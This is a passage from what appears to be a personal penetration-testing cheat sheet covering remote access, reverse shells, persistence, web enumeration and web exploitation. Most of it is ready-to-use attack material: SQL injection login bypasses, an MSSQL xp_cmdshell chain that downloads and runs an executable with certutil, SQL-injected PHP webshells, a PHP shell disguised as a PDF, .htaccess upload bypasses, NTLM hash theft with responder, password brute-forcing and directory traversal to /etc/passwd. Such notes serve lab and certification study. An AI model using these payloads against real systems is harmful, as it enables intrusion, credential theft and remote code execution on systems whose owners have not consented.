<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Meterpreter</span> <span class="nx">session</span> <span class="mi">3</span> <span class="nx">opened</span> <span class="p">(</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="p">:</span><span class="mi">443</span> <span class="o">-&gt;</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">243.40</span><span class="p">:</span><span class="mi">49159</span><span class="p">)</span> <span class="nx">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">22</span> <span class="mi">21</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">14</span> <span class="o">-</span><span class="mi">0400</span>

<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">shell</span>
</code></pre></div></div>

<h3 id="remote-access">Remote Access</h3>

<p>remote desktop / rdp</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//xfreerdp require password</span>
<span class="nx">xfreerdp</span> <span class="o">/</span><span class="nx">u</span><span class="p">:</span><span class="nx">administrator</span> <span class="o">/</span><span class="nx">p</span><span class="p">:</span><span class="nx">lab</span> <span class="o">/</span><span class="nx">v</span><span class="p">:</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>  <span class="o">+</span><span class="nx">clipboard</span> <span class="o">+</span><span class="nx">drive</span><span class="p">:</span><span class="nx">share</span><span class="p">,</span><span class="sr">/tm</span><span class="err">p
</span>
<span class="nx">rdesktop</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
<span class="nx">rdesktop</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Administrator</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">password</span> <span class="o">-</span><span class="nx">g</span> <span class="mi">80</span><span class="o">%</span>

<span class="c1">//open remote desktop </span>
<span class="nx">REG</span> <span class="nx">ADD</span> <span class="nx">HKLM</span><span class="err">\</span><span class="nx">SYSTEM</span><span class="err">\</span><span class="nx">CurrentControlSet</span><span class="err">\</span><span class="nx">Control</span><span class="err">\</span><span class="nx">Terminal</span><span class="dl">"</span><span class="s2"> </span><span class="dl">"</span><span class="nx">Server</span> <span class="o">/</span><span class="nx">v</span> <span class="nx">fDenyTSConnections</span> <span class="o">/</span><span class="nx">t</span> <span class="nx">REG_DWORD</span> <span class="o">/</span><span class="nx">d</span> <span class="mi">00000000</span> <span class="o">/</span><span class="nx">f</span> 
</code></pre></div></div>

<p>LANDesk remote management</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">telnet</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">2323</span>
</code></pre></div></div>

<p>winrm</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">evil</span><span class="o">-</span><span class="nx">winrm</span> <span class="o">-</span><span class="nx">i</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">admin</span> <span class="o">-</span><span class="nx">p</span> <span class="dl">"</span><span class="s2">password</span><span class="se">\</span><span class="s2">!</span><span class="dl">"</span>
<span class="nx">evil</span><span class="o">-</span><span class="nx">winrm</span> <span class="o">-</span><span class="nx">i</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">1.2</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">admin</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">e728ecbe728ecbe728ecbcbadfb02f51</span>
</code></pre></div></div>

<p>ssh</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ssh</span> <span class="o">-</span><span class="nx">i</span> <span class="nx">id_rsa</span> <span class="nx">dave</span><span class="p">@</span><span class="nd">172</span><span class="p">.</span><span class="mf">16.1</span><span class="p">.</span><span class="mi">1</span>
</code></pre></div></div>

<p>Sql</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//postgreSQL</span>
<span class="nx">psql</span> <span class="o">-</span><span class="nx">h</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">5432</span> <span class="o">-</span><span class="nx">U</span> <span class="nx">testuse</span>

<span class="c1">//mssql</span>
<span class="nx">sqsh</span> <span class="o">-</span><span class="nx">S</span> <span class="mf">240.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">1434</span> <span class="o">-</span><span class="nx">U</span> <span class="nx">admin</span> <span class="o">-</span><span class="nx">P</span> <span class="nx">passowrd</span> <span class="o">-</span><span class="nx">D</span> <span class="nx">umbraco</span> 
<span class="mi">1</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="mi">1</span><span class="p">;</span>
<span class="mi">2</span><span class="o">&gt;</span> <span class="nx">go</span>

<span class="nx">impacket</span><span class="o">-</span><span class="nx">mssqlclient</span> <span class="nx">Administrator</span><span class="p">:</span><span class="nx">password</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.1</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span><span class="nx">windows</span><span class="o">-</span><span class="nx">auth</span>
</code></pre></div></div>

<h3 id="only-connect-back-via-specific-port">Only connect back via specific port</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//check local port</span>
<span class="nx">netstat</span> <span class="o">-</span><span class="nx">nlptu</span>

<span class="c1">//test TCP connection</span>
<span class="nx">nc</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">4444</span>
<span class="nx">nc</span> <span class="o">-</span><span class="nx">nlvp</span> <span class="mi">4444</span>

<span class="c1">//output error to tmp file if no feedback in terminal</span>
<span class="nx">nc</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">21</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/tmp/</span><span class="nx">error</span>
<span class="nx">cat</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">error</span>

<span class="c1">//if +x doesn't work</span>
<span class="nx">chmod</span> <span class="mi">777</span> <span class="nx">rs</span>

<span class="c1">//generate reverse shell on specific port and use local port forwarding</span>
<span class="nx">socat</span> <span class="o">-</span><span class="nx">ddd</span> <span class="nx">tcp</span><span class="o">-</span><span class="nx">listen</span><span class="p">:</span><span class="mi">21</span><span class="p">,</span><span class="nx">fork</span> <span class="nx">tcp</span><span class="p">:</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="p">:</span><span class="mi">3232</span>
</code></pre></div></div>

<h3 id="persistence">Persistence</h3>

<p>Linux</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ssh</span><span class="o">-</span><span class="nx">keygen</span> <span class="o">-</span><span class="nx">t</span> <span class="nx">rsa</span>
<span class="nx">cp</span> <span class="o">~</span><span class="sr">/.ssh/i</span><span class="nx">d_rsa</span><span class="p">.</span><span class="nx">pub</span> <span class="nx">authorized_keys</span>
<span class="nx">chmod</span> <span class="mi">600</span> <span class="nx">id_rsa</span>
<span class="nx">upload</span> <span class="nx">authorized_keys</span> <span class="nx">to</span> <span class="nx">taget</span> <span class="nx">user</span><span class="o">/</span><span class="p">.</span><span class="nx">ssh</span>
<span class="nx">chmod</span> <span class="mi">600</span> <span class="nx">authorized_keys</span>
</code></pre></div></div>

<h3 id="test-connection-via-ping">Test connection via PING</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">tcpdump</span> <span class="o">-</span><span class="nx">i</span> <span class="nx">tun0</span> <span class="nx">icmp</span> <span class="o">-</span><span class="nx">v</span>

<span class="nx">wireshark</span>
</code></pre></div></div>

<h2 id="web">Web</h2>

<h3 id="framework--language">Framework &amp; language</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Wappalyzer</span>
<span class="nx">whatweb</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:50000</span>
<span class="k">try</span> <span class="nx">clicking</span> <span class="nx">each</span> <span class="nx">bottom</span> <span class="nx">on</span> <span class="nx">webpage</span>
</code></pre></div></div>

<p>check version</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">search</span> <span class="nx">version</span> <span class="k">in</span> <span class="nx">source</span> <span class="nx">page</span>
<span class="nx">click</span> <span class="p">?</span> <span class="nx">icon</span>
</code></pre></div></div>

<h3 id="virtual-host-routing">Virtual Host Routing</h3>

<p>Test invalid url. HTTP Error 400. The request hostname is invalid.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Got hostname from nmap</span>
<span class="nx">https</span><span class="p">:</span><span class="c1">//ms01.fake:8443/</span>
</code></pre></div></div>

<p>More Info after adding hostname to /etc/hosts</p>

<blockquote>
  <p>https://youtube.com/watch?v=NMGsnPSm8iw</p>

</blockquote>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Got hostname from webpage</span>
<span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:24680</span>
<span class="nx">http</span><span class="p">:</span><span class="c1">//skylark.jp:24680</span>
</code></pre></div></div>

<h3 id="directory-scan"><strong>Directory Scan</strong></h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">feroxbuster</span> <span class="o">--</span><span class="nx">url</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8090 -x pdf js html php txt json asp aspx jsp -v -k -n -e -C 404 -t 100</span>
<span class="nx">feroxbuster</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js html php txt json asp aspx jsp -v -k -n -e -C 404 -t 30</span>
<span class="nx">dirsearch</span> <span class="o">--</span><span class="nx">url</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8090 -r</span>
<span class="nx">dirsearch</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8080 --cookie="session=eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.ZmT3fQ.SuPMGLUIXOE2p-G6wS1n-uvOLw8" -x 404</span>
<span class="nx">gobuster</span> <span class="nx">dir</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8090 -w /usr/share/wordlists/dirb/small.txt -t 150</span>
<span class="nx">gobuster</span> <span class="nx">dir</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8090/backend -w /usr/share/wordlists/dirb/common.txt -t 150</span>

<span class="nx">gobuster</span> <span class="nx">dir</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,html,txt -t 90</span>
<span class="o">--</span><span class="nx">exclude</span><span class="o">-</span><span class="nx">length</span> <span class="mi">216</span>
<span class="o">-</span><span class="nx">b</span> <span class="mi">400</span><span class="p">,</span> <span class="mi">403</span><span class="p">,</span> <span class="mi">404</span>

<span class="nx">nikto</span> <span class="o">-</span><span class="nx">h</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8000</span>


<span class="nx">DONT</span> <span class="nx">SKIP</span>
<span class="o">/</span><span class="nx">api</span>

</code></pre></div></div>

<p>.git</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/.git/</span><span class="nx">logs</span><span class="o">/</span><span class="nx">HEAD</span>  <span class="c1">//important modification</span>
<span class="nx">wget</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">url</span><span class="o">/</span><span class="p">.</span><span class="nx">git</span>
<span class="c1">//https://github.com/internetwache/GitTools</span>
<span class="p">.</span><span class="o">/</span><span class="nx">gitdumper</span><span class="p">.</span><span class="nx">sh</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//worklms.helium.ctfio.com/.git/ ./website </span>
<span class="nx">git</span><span class="o">-</span><span class="nx">dumper</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//website.com/.git ~/website</span>
<span class="nx">git</span> <span class="nx">diff</span>
<span class="nx">git</span> <span class="nx">log</span>
<span class="nx">git</span> <span class="nx">log</span> <span class="o">-</span><span class="nx">p</span>
<span class="nx">git</span> <span class="nx">branch</span> <span class="o">--</span><span class="nx">list</span>
<span class="c1">//check deleted file</span>
<span class="nx">git</span> <span class="nx">show</span> <span class="mi">80</span><span class="nx">ad5fe45438bbbbbbbbbbbbbbbbbbbbb</span>
</code></pre></div></div>

<h3 id="header">Header</h3>

<p>PUT allowed &amp; Webdav enabled</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>    <span class="nx">open</span>  <span class="nx">http</span>          <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="nx">httpd</span> <span class="mf">10.0</span>
<span class="o">|</span>   <span class="nx">Public</span> <span class="nx">Options</span><span class="p">:</span> <span class="nx">OPTIONS</span><span class="p">,</span> <span class="nx">TRACE</span><span class="p">,</span> <span class="nx">GET</span><span class="p">,</span> <span class="nx">HEAD</span><span class="p">,</span> <span class="nx">POST</span><span class="p">,</span> <span class="nx">PROPFIND</span><span class="p">,</span> <span class="nx">PROPPATCH</span><span class="p">,</span> <span class="nx">MKCOL</span><span class="p">,</span> <span class="nx">PUT</span><span class="p">,</span> <span class="nx">DELETE</span><span class="p">,</span> <span class="nx">COPY</span><span class="p">,</span> <span class="nx">MOVE</span><span class="p">,</span> <span class="nx">LOCK</span><span class="p">,</span> <span class="nx">UNLOCK</span>
<span class="o">|</span>   <span class="nx">WebDAV</span> <span class="nx">type</span><span class="p">:</span> <span class="nx">Unknown</span>

<span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">401</span> <span class="nx">Unauthorized</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span>
<span class="nx">Server</span><span class="p">:</span> <span class="nx">Microsoft</span><span class="o">-</span><span class="nx">IIS</span><span class="o">/</span><span class="mf">10.0</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Powered</span><span class="o">-</span><span class="nx">By</span><span class="p">:</span> <span class="nx">ASP</span><span class="p">.</span><span class="nx">NET</span>
<span class="nx">WWW</span><span class="o">-</span><span class="nx">Authenticate</span><span class="p">:</span> <span class="nx">Basic</span> <span class="nx">realm</span><span class="o">=</span><span class="dl">"</span><span class="s2">192.168.1.1</span><span class="dl">"</span>
</code></pre></div></div>

<p>RCE https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">cadaver</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="c1">//require username:password</span>
<span class="o">&gt;</span><span class="nx">mput</span> <span class="nx">rv</span><span class="p">.</span><span class="nx">aspx</span> <span class="p">.</span>

<span class="nx">URL</span><span class="o">/</span><span class="nx">rv</span><span class="p">.</span><span class="nx">aspx</span>
</code></pre></div></div>

<h3 id="cms">CMS</h3>

<p>identify service</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">whatweb</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:81</span>
<span class="nx">searchsploit</span> <span class="nx">framework</span><span class="o">/</span><span class="nx">webpage</span> <span class="o">**</span><span class="nx">title</span><span class="o">**</span><span class="sr">/system nam</span><span class="err">e
</span></code></pre></div></div>

<p>Wordpress</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">wpscan</span> <span class="o">--</span><span class="nx">url</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">e</span> <span class="nx">p</span> <span class="o">--</span><span class="nx">plugins</span><span class="o">-</span><span class="nx">detection</span> <span class="nx">aggressive</span>
</code></pre></div></div>

<h3 id="login-panel"><strong>Login Panel</strong></h3>

<p>Password</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//weak password</span>
<span class="nx">admin</span><span class="p">:</span><span class="nx">admin</span>
<span class="nx">administrator</span><span class="p">:</span><span class="nx">administrator</span>

<span class="c1">//password bypass - Mysql</span>
<span class="nx">admin</span><span class="dl">'</span><span class="s1"> OR 1=1--
</span><span class="dl">'</span><span class="nx">OR</span> <span class="dl">''</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">	Allows authentication without a valid username.
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/sqli.auth.bypass.txt

//default credentials
cd /usr/share/seclists
grep -r  "Sonatype Nexus"

hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.1.1 ftp

Invalid password means username is right
</span></code></pre></div></div>

<p>MSSQL injection to RCE</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth</span>
<span class="dl">'</span><span class="s1"> EXEC sp_configure </span><span class="dl">'</span><span class="nx">show</span> <span class="nx">advanced</span> <span class="nx">options</span><span class="dl">'</span><span class="s1">, 1; RECONFIGURE; EXEC sp_configure </span><span class="dl">'</span><span class="nx">xp_cmdshell</span><span class="dl">'</span><span class="s1">, 1; RECONFIGURE; -- -
</span><span class="dl">'</span> <span class="nx">EXEC</span> <span class="nx">xp_cmdshell</span> <span class="dl">'</span><span class="s1">certutil -urlcache -split -f &lt;http://192.168.1.1:8888/supershell/compile/download/test_1.exe&gt; C:</span><span class="se">\\</span><span class="s1">Windows</span><span class="se">\\</span><span class="s1">Temp</span><span class="se">\\</span><span class="s1">test_1.exe &amp; C:</span><span class="se">\\</span><span class="s1">Windows</span><span class="se">\\</span><span class="s1">Temp</span><span class="se">\\</span><span class="s1">test_1.exe</span><span class="dl">'</span><span class="p">;</span> <span class="o">--</span> <span class="o">-</span>
</code></pre></div></div>

<p>MYSQL upload webshell</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//error-based </span>
<span class="dl">'</span><span class="s1"> order by 3 #
</span><span class="dl">'</span> <span class="nx">UNION</span> <span class="nx">SELECT</span> <span class="dl">"</span><span class="s2">&lt;?php system($_GET['cmd']);?&gt;</span><span class="dl">"</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span> <span class="nx">INTO</span> <span class="nx">OUTFILE</span> <span class="dl">"</span><span class="s2">/var/www/html/tmp/webshell.php</span><span class="dl">"</span> <span class="o">--</span> <span class="o">-</span>
<span class="c1">//not error-based</span>
<span class="dl">'</span><span class="s1">+UNION+SELECT+sleep(5);+--+- 
</span><span class="dl">'</span> <span class="nx">UNION</span> <span class="nx">SELECT</span> <span class="p">(&lt;</span><span class="err">?</span><span class="na">php</span> <span class="na">echo</span> <span class="na">exec</span><span class="err">($</span><span class="na">_GET</span><span class="err">[</span><span class="s">"cmd"</span><span class="err">]);)</span> <span class="na">INTO</span> <span class="na">OUTFILE</span> <span class="s">'/srv/http/cmd.php'</span><span class="err">;</span> <span class="err">--</span> 
<span class="err">%</span><span class="na">27</span><span class="err">+</span><span class="na">UNION</span><span class="err">+</span><span class="na">SELECT</span><span class="err">+%</span><span class="na">27</span><span class="err">%</span><span class="na">3C</span><span class="err">%</span><span class="na">3Fphp</span><span class="err">+</span><span class="na">echo</span><span class="err">+</span><span class="na">exec</span><span class="err">%</span><span class="na">28</span><span class="err">%</span><span class="na">24_GET</span><span class="err">%</span><span class="na">5B</span><span class="err">%</span><span class="na">22cmd</span><span class="err">%</span><span class="na">22</span><span class="err">%</span><span class="na">5D</span><span class="err">%</span><span class="na">29</span><span class="err">%</span><span class="na">3B</span><span class="err">%</span><span class="na">27</span><span class="err">+</span><span class="na">INTO</span><span class="err">+</span><span class="na">OUTFILE</span><span class="err">+%</span><span class="na">27</span><span class="err">%</span><span class="na">2Fsrv</span><span class="err">%</span><span class="na">2Fhttp</span><span class="err">%</span><span class="na">2Fcmd</span><span class="err">.</span><span class="na">php</span><span class="err">%</span><span class="na">27</span><span class="err">%</span><span class="na">3B</span><span class="err">+--</span>

<span class="na">Outputfile</span><span class="err">:</span> <span class="na">phpinfo</span> <span class="p">=&gt;</span> DOCUMENT_ROOT


delete \n in tail
try different url encode method if error 400
https://www.urlencoder.org/

</code></pre></div></div>

<p>SQL  Injection Payload</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/payloadbox/sql-injection-payload-list</span>
<span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi</span>
</code></pre></div></div>

<p>password bruteforce</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">hydra</span> <span class="o">-</span><span class="nx">l</span> <span class="nx">user</span> <span class="o">-</span><span class="nx">P</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">http</span><span class="o">-</span><span class="nx">post</span><span class="o">-</span><span class="nx">form</span> <span class="dl">"</span><span class="s2">/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid</span><span class="dl">"</span>
<span class="nx">hydra</span> <span class="o">-</span><span class="nx">l</span> <span class="nx">admin</span> <span class="o">-</span><span class="nx">P</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">http</span><span class="o">-</span><span class="kd">get</span>
</code></pre></div></div>

<p>source code</p>

<p>password forget page</p>

<p>Modify return status of email confirmation</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Add</span> <span class="s2">`user%5Bconfirmed%5D=True`</span> <span class="k">in</span> <span class="nx">Post</span> <span class="nx">Request</span> <span class="nx">to</span> <span class="nx">see</span> <span class="k">if</span> <span class="nx">we</span> <span class="nx">can</span> <span class="nx">modify</span> <span class="nx">response</span> <span class="nx">value</span>

<span class="p">{</span><span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">admin@sm.com</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">admin3</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">confirmed</span><span class="dl">"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="dl">"</span><span class="s2">created_at</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2024-06-27T22:53:29.663Z</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">updated_at</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2024-06-27T22:53:29.663Z</span><span class="dl">"</span><span class="p">}</span>

</code></pre></div></div>

<h3 id="file-upload-bypass">File Upload Bypass</h3>

<blockquote>
  <p>https://book.hacktricks.xyz/pentesting-web/file-upload</p>

</blockquote>

<p>file signature</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//hexeditor or plaintext</span>
<span class="nx">https</span><span class="p">:</span><span class="c1">//en.wikipedia.org/wiki/List_of_file_signatures</span>

<span class="c1">//rs.php for PDF bypass</span>

<span class="o">%</span><span class="nx">PDF</span><span class="o">-</span>
<span class="p">&lt;</span><span class="err">?</span><span class="na">php</span> <span class="na">echo</span> <span class="na">shell_exec</span><span class="err">($</span><span class="na">_GET</span><span class="err">[</span><span class="s">'cmd'</span><span class="err">].</span><span class="s">' 2&gt;&amp;1'</span><span class="err">);</span> <span class="err">?</span><span class="p">&gt;</span>

</code></pre></div></div>

<p>Content-Type</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//ony accept gif</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">image</span><span class="o">/</span><span class="nx">gif</span>
</code></pre></div></div>

<p>PHP extension</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Working</span> <span class="k">in</span> <span class="nx">PHPv8</span><span class="p">:</span> <span class="p">.</span><span class="nx">php</span><span class="p">,</span> <span class="p">.</span><span class="nx">php4</span><span class="p">,</span> <span class="p">.</span><span class="nx">php5</span><span class="p">,</span> <span class="p">.</span><span class="nx">phtml</span><span class="p">,</span> <span class="p">.</span><span class="nx">module</span><span class="p">,</span> <span class="p">.</span><span class="nx">inc</span><span class="p">,</span> <span class="p">.</span><span class="nx">hphp</span><span class="p">,</span> <span class="p">.</span><span class="nx">ctp</span>
</code></pre></div></div>

<p>.htaccess bypass</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">echo</span> <span class="dl">'</span><span class="s1">AddType application/x-httpd-php .dork</span><span class="dl">'</span> <span class="o">&gt;</span> <span class="p">.</span><span class="nx">htaccess</span>
<span class="c1">//upload .htaccess</span>
<span class="c1">//upload rv.dork</span>
</code></pre></div></div>

<p>ODT file &amp; stealing NTLM via responder</p>

<blockquote>
  <p>https://www.exploit-db.com/exploits/44564</p>

</blockquote>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pip</span> <span class="nx">install</span> <span class="nx">lxml</span>
<span class="nx">pip</span> <span class="nx">install</span> <span class="nx">ezodf</span>
<span class="nx">python</span> <span class="mi">44564</span><span class="p">.</span><span class="nx">py</span> 
<span class="nx">sudo</span> <span class="nx">responder</span> <span class="o">-</span><span class="nx">I</span> <span class="nx">tun0</span>
<span class="nx">hashcat</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">5600</span> <span class="nx">crack</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">force</span>
</code></pre></div></div>

<h3 id="file-inclusion-fi--directory-traversal-dt">File Inclusion (FI) / Directory Traversal (DT)</h3>

<p>example</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span><span class="o">://</span><span class="mf">192.168.1.1</span><span class="o">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">backend</span><span class="o">/?</span><span class="n">view</span><span class="o">=</span><span class="n">user</span><span class="mf">.</span><span class="n">inc</span>
<span class="n">http</span><span class="o">://</span><span class="mf">192.168.1.1</span><span class="o">:</span><span class="mi">4443</span><span class="o">/</span><span class="n">site</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">page</span><span class="o">=</span><span class="n">main</span><span class="mf">.</span><span class="n">php</span>
</code></pre></div></div>

<p>Local File Inclusion (LFI)</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">System32</span><span class="err">\</span><span class="nx">drivers</span><span class="err">\</span><span class="nx">etc</span><span class="err">\</span><span class="nx">hosts</span>
<span class="nx">filename</span><span class="o">=</span><span class="p">..</span><span class="err">\</span><span class="p">..</span><span class="err">\</span><span class="p">..</span><span class="err">\</span><span class="nx">windows</span><span class="err">\</span><span class="nx">win</span><span class="p">.</span><span class="nx">ini</span>
<span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:8000/backend/?view=../../../../etc/passwd</span>
<span class="c1">//separate to two parameters</span>
<span class="p">?</span><span class="nx">cwd</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">etc</span><span class="o">&amp;</span><span class="nx">file</span><span class="o">=</span><span class="nx">passwd</span><span class="o">&amp;</span><span class="nx">download</span><span class="o">=</span><span class="kc">false</span> 

<span class="c1">//common files for python app</span>
<span class="nx">main</span><span class="p">.</span><span class="nx">py</span>
